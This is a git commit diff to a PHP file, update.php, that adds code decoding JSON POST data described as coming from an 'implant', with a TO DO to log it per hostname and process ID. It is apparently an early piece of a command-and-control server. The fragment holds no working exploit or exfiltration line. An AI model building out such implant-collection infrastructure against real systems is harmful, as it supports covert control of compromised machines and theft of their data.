b22292eddc07c8d2cc7be0532ac2fda1857e143b
Hunter Hardman <t3ntman@gmail.com>
2017-03-19 11:25:43 -0600

    Added in JSON POST decode functionality

--- Website/update.php
+++ Website/update.php
@@ -1,3 +1,6 @@
 <?php
-    echo "This is an update response";
+    # JSON decodes implant POST data
+    $post_data = json_decode(file_get_contents("php://input"), true);
+
+    # TO DO: Add in file_put_contents from $post_data array into the <HOSTNAME>/<PID>.log file
 ?>
